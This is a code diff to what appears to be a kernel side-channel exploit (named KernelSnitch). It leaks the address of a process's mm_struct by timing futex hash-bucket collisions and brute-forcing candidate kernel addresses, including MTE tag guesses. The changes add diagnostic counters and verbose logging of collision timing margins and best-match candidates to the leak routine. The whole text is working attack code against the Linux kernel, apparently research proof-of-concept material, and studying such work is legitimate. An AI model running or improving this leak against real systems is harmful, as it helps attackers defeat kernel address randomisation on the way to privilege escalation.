@@ -215,6 +215,10 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+    size_t diag_candidates = 0;
+    size_t diag_max_matches = 0;
+    uintptr_t diag_max_candidate = 0;
+    size_t diag_max_tag = 0;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
@@ -235,12 +239,19 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 #endif
 
-                size_t found_hash = 1;
                 if (!ks->mte_enabled) {
                     // test the mm_struct candidate
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
-                    if (found_hash) {
+                    size_t matches = 0;
+                    for (size_t i = 1; i < ks->collisions; ++i)
+                        if (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate))
+                            ++matches;
+                    ++diag_candidates;
+                    if (matches > diag_max_matches) {
+                        diag_max_matches = matches;
+                        diag_max_candidate = mm_struct_candidate;
+                        diag_max_tag = 0;
+                    }
+                    if (matches == (ks->collisions - 1)) {
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
                         break;
@@ -256,10 +267,17 @@ static void *__mm_leak(void *arg)
                          ++tag_candidate) {
                         size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                         __mm_struct_candidate |= (tag_candidate << 56);
-                        found_hash = 1;
-                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
-                        if (found_hash) {
+                        size_t matches = 0;
+                        for (size_t i = 1; i < ks->collisions; ++i)
+                            if (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate))
+                                ++matches;
+                        ++diag_candidates;
+                        if (matches > diag_max_matches) {
+                            diag_max_matches = matches;
+                            diag_max_candidate = __mm_struct_candidate;
+                            diag_max_tag = tag_candidate;
+                        }
+                        if (matches == (ks->collisions - 1)) {
                             if (ks->verbose)
                                 pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                             ks->mm_struct = __mm_struct_candidate;
@@ -271,6 +289,11 @@ static void *__mm_leak(void *arg)
             }
         }
     }
+    if (ks->verbose)
+        pr_info("[% 3zd] done start=%016zx end=%016zx candidates=%zu max_matches=%zu/%zu max_candidate=%016zx tag=%zu\n",
+                range->id, range->start, range->end, diag_candidates,
+                diag_max_matches, ks->collisions - 1,
+                diag_max_candidate, diag_max_tag);
     free(mm_leak_arg);
     return 0;
 }
@@ -411,7 +434,12 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
     __increase(ks, ID, ks->appended_futexes);
-    if (ks->verbose) pr_info("start finding collisisons\n");
+    if (ks->verbose) {
+        pr_info("start finding collisisons\n");
+        pr_info("approx_time=%zu threshold=%zu (x%d) appended=%zu\n",
+                approx_time, approx_time*KERNELSNITCH_THRESHOLD_MULT,
+                (int)KERNELSNITCH_THRESHOLD_MULT, ks->appended_futexes);
+    }
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
@@ -439,7 +467,10 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 #endif
             count++;
             ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
+            if (ks->verbose)
+                pr_info("  collision[%zu] %016zx time=%zu margin=%zu\n",
+                        count, futex_addr, ks->times[i],
+                        ks->times[i] - approx_time*KERNELSNITCH_THRESHOLD_MULT);
         }
     }
     if (wanted == count) {
